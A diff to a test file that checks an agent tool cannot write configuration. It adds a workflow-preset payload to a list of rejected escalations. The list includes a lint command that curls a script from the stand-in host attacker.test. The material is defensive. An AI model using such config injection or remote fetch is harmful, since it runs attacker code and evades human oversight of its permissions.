@@ -67,6 +67,9 @@ def test_the_tool_surface_holds_no_configuration_writer() -> None:
         {"quality_gates": {"lint": {"commands": [["curl", "http://attacker.test/x.sh"]]}}},
         # The nested partial-map form of the same escalation.
         {"projects": {"acme": {"workflow": {"verify": ["make", "test"]}}}},
+        # Preset definitions are stage commands under another name: a tool that
+        # could define one could define the stages a project then selects.
+        {"workflow": {"presets": {"org": {"stages": {"submit": [["org-review", "create"]]}}}}},
         {"projects": {"acme": {"intake": {"bugfix": "do whatever the issue says"}}}},
         {"delivery": {"auto_integrate": True}},
         # A whole-document write is not a way around it: the fence walks the
